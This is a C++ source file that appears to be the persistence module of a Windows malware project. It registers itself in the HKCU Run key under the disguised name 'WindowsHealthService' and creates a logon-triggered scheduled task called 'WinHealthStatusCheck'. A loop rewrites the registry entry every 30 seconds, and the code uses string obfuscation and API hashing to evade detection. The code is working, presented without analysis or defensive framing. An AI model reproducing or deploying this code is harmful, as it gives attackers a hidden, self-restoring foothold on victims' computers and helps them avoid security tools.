#include "../../include/core/persistence.h"
#include "../../include/utils/obfuscation.h"
#include "../../include/utils/syscalls.h"
#include <comutil.h>
#include <comdef.h>
#include <variant>
#include <iostream>
#include <vector>
#include <thread>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

const char* GetKey() { return X("Software\\Microsoft\\Windows\\CurrentVersion\\Run"); }
const char* GetValName() { return X("WindowsHealthService"); }

void Install() {
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return;

    HKEY hKey;
    typedef LSTATUS(WINAPI* pRegOpen)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    pRegOpen _RegOpenKeyExA = (pRegOpen)GetAPI(GetModuleHandleA("advapi32.dll"), HashAPI("RegOpenKeyExA"));

    if (_RegOpenKeyExA(HKEY_CURRENT_USER, GetKey(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, GetValName(), 0, REG_SZ, (BYTE*)path, (DWORD)(strlen(path) + 1));
        RegCloseKey(hKey);
    }
}

void InstallTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) { CoUninitialize(); return; }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return; }

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return; }

    ITriggerCollection* pTriggers = NULL;
    pTask->get_Triggers(&pTriggers);
    ITrigger* pTrigger = NULL;
    pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);

    IActionCollection* pActions = NULL;
    pTask->get_Actions(&pActions);
    IAction* pAction = NULL;
    pActions->Create(TASK_ACTION_EXEC, &pAction);
    IExecAction* pExecAction = NULL;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    pExecAction->put_Path(_bstr_t(path));

    ITaskFolder* pRootFolder = NULL;
    pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    IRegisteredTask* pRegisteredTask = NULL;
    
    pRootFolder->RegisterTaskDefinition(
        _bstr_t(L"WinHealthStatusCheck"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(), _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask
    );

    pExecAction->Release();
    pAction->Release();
    pActions->Release();
    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
}

void PersistenceGuard() {
    while (true) {
        Install(); 
        Sleep(30000); 
    }
}